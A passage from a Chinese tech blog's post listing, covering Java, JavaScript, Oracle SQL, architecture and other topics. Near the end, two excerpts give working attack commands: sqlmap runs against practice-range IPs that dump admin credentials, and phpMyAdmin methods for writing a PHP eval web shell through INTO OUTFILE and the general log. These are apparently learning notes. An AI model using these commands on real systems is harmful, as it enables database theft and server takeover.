各样的方法，最终没有解决。当我要放弃的时候，用两个按钮来实现这一个按钮功能，抱着试试
的态度，从新看了遍数据手册，看看能不能通过别的方法解决。功夫不负有心人，终于被我找到
了，键值返回按钮+0x0016这个变量：
看到这里，我心情很激动。实现思路如下：
检测到当前按钮按键值：比键值是0x03，这个时候我就不再判定键值了，而是读0x0016这个变量，当检测到有抬起动作，则
虚拟一个键值0x05，代码如下：
这样就实现了我要的功能，至于为什么是第一种方法在1.8K代码量时候失效，我也不清楚，可能是Bug吧。
今天测试发现一个问题，就是屏幕刚开机上电10s内，第一次按住长按按钮，它会自动给你发起抬起消息，
第二次就正常了，还有开机10S后，第一次点击就正常。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dea5f87ff91e5891cc423c5d697cc6a/" rel="bookmark">
			1/1!&#43;1/2!&#43;1/3!&#43;1/4!&#43;...1/n!
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 #include &lt;stdio.h&gt; int main() { double sum=0; int n; scanf("%d",&amp;n); for(int i=1;i&lt;=n;i++) { long jec=1; for(int j=1;j&lt;=i;j++) { jec*=j; } sum+=1.0/jec; } printf("%.2lf",sum); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4234b70cbc07ea15ef8a234cb9dd6ae6/" rel="bookmark">
			Promise构造函数的Promise.resolve()方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Promise.resolve(value)方法返回一个由 给定的value 决议的Promise对象。
如果value的值为promise，返回这个promise；
如果value的值是thenable(即，带有then方法的对象)，返回的Promise对象的最终状态由then方法执行决定；
否则的话(即value为 空，基本类型或者不带then方法的对象),返回的Promise对象状态为fulfilled，并且将该value传递给对应的then方法。
先看看简单的例子:
Promise.resolve("Success").then(function(value) { console.log(value); // "Success" }, function(value) { // 不会被调用 }); 语法 Promise.resolve(value); 参数：value 是将被Promise对象resolve的参数。value 也可以是一个Promise对象，或者是一个thenable。（Argument to be resolved by this Promise. Can also be a Promise or a thenable to resolve.）
举例一：resolve是另外一个promise对象
let original = Promise.resolve('happy chen'); let cast = Promise.resolve(original); cast.then((val) =&gt; { console.log(val); }) console.log(`original === cast ? ${original === cast}`); // original === cast ? true // happy chen 这里由于 异步地 调用then 方法，所以 有一个同步异步先后执行的区别
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4234b70cbc07ea15ef8a234cb9dd6ae6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce010a7e26ce4545bbece407d6a70fe4/" rel="bookmark">
			可扩展架构的方法论——AKF扩展立方体
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 AKF扩展立方体（Scalability Cube），是《架构即未来》一书中提出的可扩展模型，这个立方体有三个轴线，每个轴线描述扩展性的一个维度，他们分别是产品、流程和团队： X轴 —— 代表无差别的克隆服务和数据，工作可以很均匀的分散在不同的服务实例上； Y轴 —— 关注应用中职责的划分，比如数据类型，交易执行类型的划分； Z轴 —— 关注服务和数据的优先级划分，如分地域划分。 三个维度扩展的对比 通过这三个维度上的扩展，可以快速提高产品的扩展能力，适应不同场景下产品的快速增长。不同维度上的扩展，有着不同的优缺点：
X轴扩展
优点：成本最低，实施简单； 缺点：受指令集多少和数据集大小的约束。当单个产品或应用过大时，服务响应变慢，无法通过X轴的水平扩展提高速度； 场景：发展初期，业务复杂度低，需要增加系统容量。 Y轴扩展
优点：可以解决指令集和数据集的约束，解决代码复杂度问题，可以实现隔离故障，可以提高响应时间，可以使团队聚焦更利于团队成长； 缺点：成本相对较高； 场景：业务复杂，数据量大，代码耦合度高，团队规模大。 Z轴扩展
优点：能解决数据集的约束，降低故障风险，实现渐进交付，可以带来最大的扩展性。 缺点：成本最昂贵，且不一定能解决指令集的问题； 场景：用户指数级快速增长。 如何将理论付诸实践？ 为扩展分割应用
X轴：从单体系统或服务，水平克隆出许多系统，通过负载均衡平均分配请求； Y轴 ：面向服务分割，基于功能或者服务分割，例如电商网站可以将登陆、搜索、下单等服务进行Y轴的拆分，每一组服务再进行X轴的扩展； Z轴 ：面向查找分割，基于用户、请求或者数据分割，例如可以将不同产品的SKU分到不同的搜索服务，可以将用户哈希到不同的服务等。 为扩展分割数据库
X轴：从单库，水平克隆为多个库上读，一个库写，通过数据库的自我复制实现，要允许一定的读写时延； Y轴 ：根据不同的信息类型，分割为不同的数据库，即分库，例如产品库，用户库等； Z轴 ：按照一定算法，进行分片，例如将搜索按照MapReduce的原理进行分片，把SKU的数据按照不同的哈希值进行分片存储，每个分片再进行X轴冗余。 为扩展而缓存
在理想情况下，处理大流量最好的方法是通过高速缓存来避免处理它。从架构层面看，我们能控制的主要有以下三个层次的缓存： 对象缓存：对象缓存用来存储应用的对象以供重复使用，一般在系统内部，通过使用应用缓存可以帮助数据库和应用层卸载负载。 应用缓存：应用缓存包括代理缓存和反向代理缓存，一个在用户端，一个在服务端，目标是提高性能或减少资源的使用量。 内容交付网络缓存：CDN的总原则是将内容推送到尽可能接近用户终端的地方，通过不同地区使用不同ISP的网关缓存，达到更快的响应时间和对源服务的更少请求。 位扩展而异步
同步改异步：同步调用，由于调用间的同步依赖关系，有可能会导致雪崩效应，出现一系列的连锁故障，进而导致整个系统出现问题，所以在进行系统设计时，要尽可能的考虑异步调用方式，邮件系统就是一个非常好的异步调用例子。 应用无状态：当进行AKF扩展立方体的任何一个轴上的扩展时，都要首先解决应用的状态问题，即会话的管理，可以通过避免、集中和分散的方式进行解决。 AKF扩展立方体是一套通用的扩展性理论，它不仅可以应用到系统的架构扩展上，也可以应用到人员的组织架构扩展上甚至其他相关的工业领域。 当然并不是所有公司都需要同时在XYZ三个方向上进行扩展，并且每个方向上的扩展都有它的利弊，我们不可避免的要进行适当的权衡。最重要的，我们应当首先理解这套理论背后所体现出来的扩展哲学。 就像书里所描述的，这不仅涉及到科学，还涉及到艺术！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/becc8501c3063d7c7d72dc79c54e7dfd/" rel="bookmark">
			死磕 java线程系列之ForkJoinPool深入解析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（手机横屏看源码更方便）
注：java源码分析部分如无特殊说明均基于 java8 版本。
注：本文基于ForkJoinPool分治线程池类。
简介 随着在硬件上多核处理器的发展和广泛使用，并发编程成为程序员必须掌握的一门技术，在面试中也经常考查面试者并发相关的知识。
今天，我们就来看一道面试题：
如何充分利用多核CPU，计算很大数组中所有整数的和？
剖析 单线程相加？ 我们最容易想到就是单线程相加，一个for循环搞定。
线程池相加？ 如果进一步优化，我们会自然而然地想到使用线程池来分段相加，最后再把每个段的结果相加。
其它？ Yes，就是我们今天的主角——ForkJoinPool，但是它要怎么实现呢？似乎没怎么用过哈^^
三种实现 OK，剖析完了，我们直接来看三种实现，不墨迹，直接上菜。
/** * 计算1亿个整数的和 */ public class ForkJoinPoolTest01 { public static void main(String[] args) throws ExecutionException, InterruptedException { // 构造数据 int length = 100000000; long[] arr = new long[length]; for (int i = 0; i &lt; length; i ) { arr[i] = ThreadLocalRandom.current().nextInt(Integer.MAX_VALUE); } // 单线程 singleThreadSum(arr); // ThreadPoolExecutor线程池 multiThreadSum(arr); // ForkJoinPool线程池 forkJoinSum(arr); } private static void singleThreadSum(long[] arr) { long start = System.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/becc8501c3063d7c7d72dc79c54e7dfd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cdcc97da5f2cc6a6764371244f61d1b3/" rel="bookmark">
			Oracle行转列、列转行的几种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、行转列
我们的表结构和数据如下：
1、使用PIVOT函数
Oracle 11g之后，支持使用PIVOT实现行转列
函数说明：
PIVOT（任意聚合函数 FOR 列名 IN（类型））
其中，【聚合函数】聚合的字段，是需要转化为列值的字段；【列名】是需要转化为列标识的字段，【类型】即是需要的结果展示，【类型】中可以指定别名； IN中还可以指定子查询。
针对我们如上例子，查询SQL应该为：
SQL：
SELECT * FROM (
SELECT A16.INTEREST_RATE_CD
,A16.DATA_DT
,A16.TERM
,A16.INTEREST_RATE
FROM FACT_FTP260_BSC_A16 A16
)
PIVOT(
SUM(INTEREST_RATE)
FOR TERM
IN ('1D' AS D1 ,'7D' AS D7 ,'14D' AS D14
,'1M' AS M1 ,'2M' AS M2 ,'6M' AS M6
,'9M' AS M9 ,'1Y' AS Y1 ,'2Y' AS Y2
,'3Y' AS Y3 ,'5Y' AS Y5 ,'7Y' AS Y7
,'10Y' AS Y10 ,'15Y' AS Y15 )
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cdcc97da5f2cc6a6764371244f61d1b3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb19d3ee258bbf4eca7059d70090c899/" rel="bookmark">
			DKVMN知识追踪描述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		由于在线学习课程的兴起，学习者在课程学习过程中有很多习题练习的记录，利用这些记录，知识追踪(Knowledge Tracing)希望通过对学习者过往练习的结果分析其当前对一些概念的掌握程度。知识追踪任务可以形式化为一个有监督的序列学习问题：即给定学习者过去的练习记录 X = {x1, x2,…,xt-1},预测学习者对一个新的练习回答正确的概率，即：p(rt=1|qt,X)。典型的知识追踪方法有：Bayesian Knowledge Tracing(BKT) 和 Deep Knowledge Tracing(DKT). 在第一种 Bayesian Knowledge Tracing 中，学习者的知识状态st由知识概念集合{sti}表示，每个知识概念(concept state)为二元取值，表示 known 和 unknown，然后用隐马尔可夫模型更新知识概念状态的后验分布。BKT的不足有两方面：1）由于每个知识概念是单独表示的，BKT无法捕捉不同概念之间的相关性。2）BKT模型可以输出学习者对于预定义的学习概念的掌握情况，但是无法捕捉未定义的概念。3）BKT 用简单的转换模型来描述学习者对于不同概念的掌握情况，这就导致了 BKT 无法有效表示复杂的概念状态转换。第二种方法 Deep Knowledge Tracing, 运用了典型的 RNN 模型 LSTM，LSTM 用高维连续的向量空间表示S来模拟知识状态，输入和状态(input-to-state)，状态和状态(state-to-state)之间的非线性转换使得DKT的表达能力比BKT更强，同时不需要人工对知识概念的标注，但是DKT将学习者当前对于所有概念的掌握情况用一个隐藏状态(hidden state)表示，这导致了DKT无法输出学习者对于具体概念的掌握情况。本文提出的 Dynamic Key-Value Memory Networks(DKVMN)模型借鉴了 MANN(memory-augmented neural networks),但是不像传统的MANN模型用单个记忆矩阵(memory matrix)或者两个静态记忆矩阵(static memory matrices)，DKVMN 用一个静态矩阵 key 存贮所有的知识概念(knowledge concept)和一个动态的矩阵 value 存储以及更新学习者对于概念的掌握程度。DKVMN模型在追踪不同概念的掌握状态的同时能捕捉不同概念之间的关系。它对每个知识概念维护了一个概念状态(concept state)，并且会自动学习当前的练习输入和各个知识概念之间的相关关系，当一个新的练习输入，DKVMN 会先选择和当前练习相关的知识概念，然后根据学习者的回答的正误情况更新相关知识概念的状态。
本文实验所用数据集有四个：Synthetic-5, ASSISTments2009, ASSISTment2015, Statics2011. 前一个为机器生成的数据集，后三个是从在线学习平台获取的真实的数据集。在四个数据集上的测试，DKVMN 较之 BKT，DKT，MANN 都有所提升。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/df0c191b8427b33f7875d9be42ff34a7/" rel="bookmark">
			element-ui Cascader 级联选择器 点击label选中
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 通过修改label的样式解决：
注意：el-cascader-panel 是直接挂载在body上的，所以需要全局设置
.el-cascader-panel .el-radio{ width: 100%; height: 100%; z-index: 10; position: absolute; top: 10px; right: -10px; } .el-cascader-panel .el-radio__input{ visibility: hidden; //隐藏单选框，不隐藏就不用设置 } .el-cascader-panel .el-cascader-node__postfix{ top: 10px; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/20d5e495d1d4d351e847360e435a6599/" rel="bookmark">
			对称加密与非对称加密的区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简单说对称加密就是加密与解密时使用的密码相同，如下图：
如加密时使用的是密码"123"，那对方解密时也是使用"123"进行解密
存在安全隐患
非对称加密如下图：
例如：“屌丝”要给“高富帅”传输数据，屌丝的加密密码为“123”，此时通过加密工具（RSA）生成一个公钥A和私钥A，“高富帅”也一样生成一个公钥B和私钥B，“屌丝”会用对方的公钥B和自己的公钥A同时对数据进行加密（你可以想象成“苍老师”为数据，公钥A锁数据的左边，公钥B锁数据的右边），当数据传到“高富帅”时，用私钥解密，这样安全性更高，双方都不会知道对方的密码是多少。
公钥：好比一把锁
私钥：好比钥匙
非对称加密和对称加密在加密和解密过程、加密解密速度、传输的安全性上都有所不同，具体介绍如下：
1、加密和解密过程不同
对称加密过程和解密过程使用的同一个密钥，加密过程相当于用原文+密钥可以传输出密文，同时解密过程用密文-密钥可以推导出原文。但非对称加密采用了两个密钥，一般使用公钥进行加密，使用私钥进行解密。
2、加密解密速度不同
对称加密解密的速度比较快，适合数据比较长时的使用。非对称加密和解密花费的时间长、速度相对较慢，只适合对少量数据的使用。
3、传输的安全性不同
对称加密的过程中无法确保密钥被安全传递，密文在传输过程中是可能被第三方截获的，如果密码本也被第三方截获，则传输的密码信息将被第三方破获，安全性相对较低。
非对称加密算法中私钥是基于不同的算法生成不同的随机数，私钥通过一定的加密算法推导出公钥，但私钥到公钥的推导过程是单向的，也就是说公钥无法反推导出私钥。所以安全性较高。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7339846985d3d7fd0762887b022e8118/" rel="bookmark">
			No Spring Session store is configured: set the &#39;spring.session.store-type&#39; property
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		记录问题 org.springframework.beans.factory.BeanCreationException: Error creating bean with name ‘org.springframework.boot.autoconfigure.session.SessionAutoConfiguration$SessionRepositoryValidator’: Invocation of init method failed; nested exception is java.lang.IllegalArgumentException: No Spring Session store is configured: set the ‘spring.session.store-type’ property 这里我们将此配置信息放入application.properites之中：
spring.session.store-type=none
如果使用redis存储session：
spring.session.store-type=redis
之后就启动成功
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/03b149221c2804e59d47cd8b567edbfb/" rel="bookmark">
			AD中PCB检查设计错误规则设置（DRC检查配置）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 AD中PCB检查设计错误规则设置 遇到的问题：在设计好的PCB电路中，我们不能保证所有的线是否一次性全部布好，此时我们一般情况下需要设置电路的布线规则检查，以确保电路在布线的时候不会发生错误，下面我将向大家介绍设计规则检查的设置。通过以下设置能保证绝大部分（%90）的用户的使用不会在这个问题上出错 工具+设计规则检查（快捷键 T+D），进入后界面如下所示：
开始配置（勾选）项： 第1步：
注：第一个界面默认是以上配置，如有问题，请自行修改到默认的参数第2步：
第3步：
第4步：
第5步：
第6步：
第7步：
第8步：
第9步：
最后：点击确定，运行DRC,即可确定布线是否有错误。
欢迎大家评论，后续有需要会进行完善和修改 ！！！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b9af4e901407120d9e1a4981fda0fbec/" rel="bookmark">
			Vue &#43; Axios 使用post请求方法时，传参的两种方式（FormData、json字符串）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、表单数据 FormData 1.1、控制台显示效果如下
1.2、axios配置，设置请求头：
Header
解释
示例（参考这里）
Accept
指定客户端能够接收的内容类型
Accept: text/plain, text/html
Content-Type
请求的与实体对应的MIME信息
Content-Type: application/x-www-form-urlencoded
封装axios请求文件中，axios实例对象的请求request中，添加请求头的`Accept`属性值，和请求头的`post['Content-Type']`属性值
1.3、请求接口封装文件中，引入qs中间件，请求方法为post时，参数需要通过qs.stringify函数进行格式转换
二、json字符串 2.1、控制台显示效果如下
2.2、封装axios请求文件中，配置请求头的`post['Content-Type']`的属性值
2.3、请求接口封装文件中，请求方法为post时，参数可以使用JSON.stringify()函数转换，也可不转换，即直接传参数params也可
写给自己的随笔，有问题欢迎指出¯\_(ツ)_/¯
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/206d3b5506637a146cecdb2252c5e965/" rel="bookmark">
			多媒体视频开发_(3) ffmpeg获取视频的总帧数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在ffmpeg中通常使用 ffprobe来获取视频流的总帧数；这种类型的任务是ffprobe擅长的。
命令行：
ffprobe -v error -count_frames -select_streams v:0 -show_entries stream=nb_read_frames -of default=nokey=1:noprint_wrappers=1 input.mp4 输出:
6000 &gt;在本例中，6000的输出是指读取帧的数量。
&gt;因为整个文件必须解码，命令可能需要一段时间才能完成，具体取决于具体的输入文件大小。
选项的含义
&gt; -v error：这隐藏了“info”输出(版本信息等)，使解析更容易。
&gt; -count_frames：计算每个流的帧数，并在相应的流部分中报告。
&gt; -select_streams v:0 ：仅选择视频流。
&gt; -show_entries stream = nb_read_frames ：只显示读取的帧数。
&gt; -of default = nokey = 1：noprint_wrappers = 1 ：将输出格式(也称为“writer”)设置为默认值，不打印每个字段的键(nokey = 1)，不打印节头和页脚(noprint_wrappers = 1)。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bfb3144920393daf95f511e3ac339c13/" rel="bookmark">
			安全提示＂X-Frame-Options头未设置＂解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安全提示＂X-Frame-Options头未设置＂
X-Frame-Options 响应头
X-Frame-Options HTTP响应头是用来确认是否浏览器可以在frame或iframe标签中渲染一个页面，网站可以用这个头来保证他们的内容不会被嵌入到其它网站中，以来避免点击劫持。
危害：
攻击者可以使用一个透明的、不可见的iframe，覆盖在目标网页上，然后诱使用户在该网页上进行操作，此时用户将在不知情的情况下点击透明的iframe页面。通过调整iframe页面的位置，可以诱使用户恰好点击iframe页面的一些功能性按钮上，导致被劫持。
X-Frame-Options 响应头
X-Frame-Options HTTP 响应头是用来给浏览器指示允许一个页面可否在 , 或者 中展现的标记。网站可以使用此功能，来确保自己网站的内容没有被嵌到别人的网站中去，也从而避免了点击劫持 (clickjacking) 的攻击。
使用 X-Frame-Options
X-Frame-Options 有三个值:
DENY
表示该页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。
SAMEORIGIN
表示该页面可以在相同域名页面的 frame 中展示。
ALLOW-FROM uri
表示该页面可以在指定来源的 frame 中展示。
换一句话说，如果设置为 DENY，不光在别人的网站 frame 嵌入时会无法加载，在同域名页面中同样会无法加载。另一方面，如果设置为 SAMEORIGIN，那么页面就可以在同域名页面的 frame 中嵌套。
配置 Apache
配置 Apache 在所有页面上发送 X-Frame-Options 响应头，需要把下面这行添加到 ‘site’ 的配置中:
Header always append X-Frame-Options SAMEORIGIN
1
配置 nginx
配置 nginx 发送 X-Frame-Options 响应头，把下面这行添加到 ‘http’, ‘server’ 或者 ‘location’ 的配置中:
## 表示该页面可以在相同域名页面的 frame 中展示
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bfb3144920393daf95f511e3ac339c13/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8af36605c7c1cd780311e4f893b1cb00/" rel="bookmark">
			springboot优缺点
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		（一）优点：
1，配置变得简单了
2，.springboot内嵌了servlet容器，降低了对环境的要求，机器有java运行环境，可以将项目打包成jar包，通过java命令 java -jar ***.jar 来执行。
3，.快速整合第三方框架，无需配置文件
4.解决了Spring的弊端
5.代码少了、配置文件少了、不需要对第三方框架烦恼了、项目精简了，对整个团队的开发及维护来说，更大的节约了成本。
6.使用Java或Groovy开发基于Spring的应用程序非常容易。
7.它减少了大量的开发时间并提高了生产力。
8.它避免了编写大量的样板代码，注释和XML配置。
8.Spring Boot应用程序与其Spring生态系统(如Spring JDBC，Spring ORM，Spring Data，Spring Security等)集成非常容易。
它遵循“自用默认配置”方法，以减少开发工作量。
它提供嵌入式HTTP服务器，如Tomcat，Jetty等，以开发和测试Web应用程序非常容易。
它提供CLI(命令行界面)工具从命令提示符，非常容易和快速地开发和测试Spring Boot(Java或Groovy)应用程序。
它提供了许多插件来开发和测试Spring启动应用程序非常容易使用构建工具，如Maven和Gradle。
它提供了许多插件，以便与嵌入式和内存数据库工作非常容易。
（二）Spring Boot的限制:
将现有或传统的Spring Framework项目转换为Spring Boot应用程序是一个非常困难和耗时的过程。它仅适用于全新Spring项目。
微服务感觉像是架构中的组合模式。把能独立的业务模块分离出来单独部署。实现开发、维护上的分离。避免整体升级带来的麻烦。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5d13035e9c9aa70a462ddb064c5010cc/" rel="bookmark">
			设计一个递归函数，求x的n次幂
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 //2019-11-6 #include &lt;stdio.h&gt; //设计一个递归函数，求x的n次幂： //主函数通过键盘输入x和n的值，并输出x^n的值（假设x为实数，n为正整数） double fun(double x,int n){ if(n==1) return x; return x*fun(x,n-1); } int main() { double x; int n; double result=0; scanf("%lf %d",&amp;x,&amp;n); result=fun(x,n); printf("%.2lf\n",result); return 0; } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e16e02145ba6c423cae934bb20470bab/" rel="bookmark">
			0.微服务概述
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.微服务定义
微服务的架构是指: 将单体应用程序开发为一组小型服务的方法，服务都在自己的进程中运行并通过轻量级的机制(通常是HTTP)来进行通信。 这些服务围绕业务功能来构建，并且可以独立部署，可以使用不同语言编写，可以使用不同的存储技术。 微服务是一种架构风格 2.微服务使用时机
1.在单体应用足够大，业务功能繁杂难以管理，上线难度大的时候，可以考虑微服务架构 2.考虑充分，要权衡利弊，能有效的规避掉微服务的弊端， 例如分布式远程调用的风险，分布式系统保持数据一致性的难度，小型服务增加的运营难度及成本。 3.准备充分后，在具体拆分的时候，应该尽量保证每次拆分出去的服务的原子性，不能影响单体应用内的其他服务。 3.微服务的概述
对于微服务的架构风格来说，有一定的共同特征，但是并不是所有微服务都具有这些特征，应该视实际情况而定 1.通过服务进行组件化(Componentization via Services):将应用程序拆分为一组小型的服务组件 *应用程序组件化 *组件就是可以独立替换和升级的软件单元 *微服务架构组件化的方式是将其分解为服务(可以理解为进程外的组件) *使用服务作为组件的好处是服务可以独立部署 2.按业务进行构建团队(Organized around Business Capabilities):而不是以往的按技术来构建(UI团队，前端，后端，DBA，运维等) 3.微服务是一个产品，而不是一个项目(Products not Projects):传统项目在交付后就不再由开发团队来运营了，而微服务不同，开发团队应该一直负责。 这个特征是一个新的改变，意图大概是为了完善微服务在实际运行中出现的问题。 4.智能端点和哑管道(Smart endpoints and dumb pipes):智能终端和弱通信，意思就是微服务是一个能独立处理自己的业务的一个终端，通信使用弱通信方式 微服务是完全独立的终端服务，能很智能的处理自己的业务逻辑 微服务通信使用弱通信，不需要ESB来转发，即去中心化 5.去中心化治理(Decentralized Governance):分散管理，不受限制，力求用最佳的方式解决问题 6.去中心化的数据管理(Decentralized Data Management):微服务独自管理自己的数据库 分布式事务难以实现 微服务提倡无事务的通信，实际的一致性只是最终的一致性 7.基础设施自动化(Infrastructure Automation):即自动化部署 8.容错设计(Design for failure):微服务中的断路器，就是服务出现问题，直接拉闸返回一个固定的信息 9.进化设计(Evolutionary Design):灵活使用微服务 论文中举例说:例如一个网站的促销页面，作为一个微服务出现，在使用完后即可丢弃而不影响整体，这是微服务的更高级别的使用 4.微服务的优缺点
优点: 模块化 独立部署 技术多样性(即不同的微服务可以使用不同的语言，框架及数据存储技术) 缺点: 系统间通信问题:远程调用速度慢，而且有失败的风险 数据一致性:难以保持强一致性，只能保持最终一致性 运营复杂:需要一个成熟的运营团队来管理大量服务 5.SOA与微服务
定义: SOA(面向服务的架构):SOA架构是一个组件模型，也是将服务拆分，然后通过ESB企业服务总线来进行通信 微服务：微服务架构是将单体应用拆分为一组服务，每个服务独立运行，通信通过轻量级的机制来进行 区别: 1.通信:微服务没有使用ESB,使用Http(REST API)进行轻量化通信 2.架构拆分:微服务强调按业务拆分(垂直拆分)，SOA强调水平拆分(前端，后端，数据库等) 3.部署:微服务是独立部署互不影响，SOA实际还是部署在同一进程中 4.范围:SOA是应用于整个企业，微服务是应用于整个应用 SOA架构与微服务架构示例图如下:
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/723e8a24808cd59f2b3bb80ba1c68dc8/" rel="bookmark">
			LocalDateTime  获取当月的第一天和最后一天的日期
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 public static void main(String[] args) { DateTimeFormatter fmt = DateTimeFormatter.ofPattern("yyyy-MM-dd"); LocalDateTime date = LocalDateTime.now(); LocalDateTime firstday = date.with(TemporalAdjusters.firstDayOfMonth()); LocalDateTime lastDay = date.with(TemporalAdjusters.lastDayOfMonth()); System.out.println("firstday:" + firstday.format(fmt)); System.out.println("lastDay:" + lastDay.format(fmt)); } table 设置表格字体 &lt;style&gt; .layui-table-cell { height:auto; font-size: 15px; letter-spacing:2px; overflow:visible; text-overflow:inherit; white-space:normal; word-break:break-all } &lt;/style&gt; overflow-x: hidden; overflow-y: auto; 修改layui.css 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/12b1f82abd481aa9a5e38acc09b9818f/" rel="bookmark">
			sqlmap的使用方法（含靶场）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0x00 sqlmap简介 Sqlmap的7种等级：
常用–leve 3
0x01 mysql数据库的注入 靶场地址：http://59.63.200.79:8003
查看数据库名
sqlmap -u "http://59.63.200.79:8003/?id=1" --dbs 查看表
sqlmap -u "http://59.63.200.79:8003/?id=1" -D maoshe --tables 查看列
sqlmap -u "http://59.63.200.79:8003/?id=1" -D maoshe -T admin --columns 查看字段
sqlmap -u "http://59.63.200.79:8003/?id=1" -D maoshe -T admin -C "Id,username,password" --dump 0x02 COOKIE注入 靶场地址：http://117.167.136.245:10181/
查看表
sqlmap -u "http://117.167.136.245:10181/shownews.asp" --cookie "id=170" --table --level 2 查看列
sqlmap -u "http://117.167.136.245:10181/shownews.asp" --cookie "id=170" -T admin --columns --level 2 查看字段
sqlmap -u "http://117.167.136.245:10181/shownews.asp" --cookie "id=170" -T admin -C "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/12b1f82abd481aa9a5e38acc09b9818f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/44062b390f66547da3a33f072b0c603e/" rel="bookmark">
			phpmyadmin后台getshell方法学习总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		0x00 前言 最近看的一篇文章中提到过phpmyadmin一些后台getshell方式，就想着写篇博客学习总结一下~~
0x01 getshell方法 一、select into outfile直接写入 1.利用条件
对web目录需要有写权限能够使用单引号知道绝对路径secure_file_priv没有具体值
2.步骤
查看有没有配置secure_file_priv show global variables like '%secure%'; secure_file_priv为NULL，表示限制mysql不允许导入导出。没有具体值时，表示不对mysqld 的导入导出做限制。
当知道路径时（通过报错获取路径/phpinfo），可以直接用
?id=1 union select "&lt;?php @eval($_POST['quan']);?&gt;" into outfile("G:/phpStudy/PHPTutorial/www/quan.php") 或者选择一个数据库如test
新创建一个表a
在a中插入&lt;?php @eval($_POST['quan']);?&gt;
然后select * from a into outfile 'G:/phpStudy/PHPTutorial/www/quan.php';
将a中的数据导出到文件quan.php
二、开启全局日志getshell 1.利用条件
必须是root权限
2.步骤
查看配置
show variables like '%general%'; 开启general log模式
set global general_log = on; 设置日志目录为shell地址
set global general_log_file = 'G:/phpStudy/PHPTutorial/www/quan.php'; 写入shell
select '&lt;?php eval($_POST[cmd]);?&gt;' 文件内容如下，然后用菜刀连就好啦
三、使用慢查询日志getshell 1.慢查询日志
记录所有执行时间超过long_query_time秒的所有查询或者不使用索引的查询。默认情况下，MySQL数据库是不开启慢查询日志的，long_query_time的默认值为10（即10秒，通常设置为1秒），即运行10秒以上的语句是慢查询语句。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/44062b390f66547da3a33f072b0c603e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3ad8b4de78b137961b69d8d3e9517f24/" rel="bookmark">
			DBMS_METADATA.GET_DDL
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DBMS_METADATA包中的get_ddl是获取对象定于语句的函数 –具体参数如下，次函数必须传输object_type和 name参数，其他参数有默认值可选传。
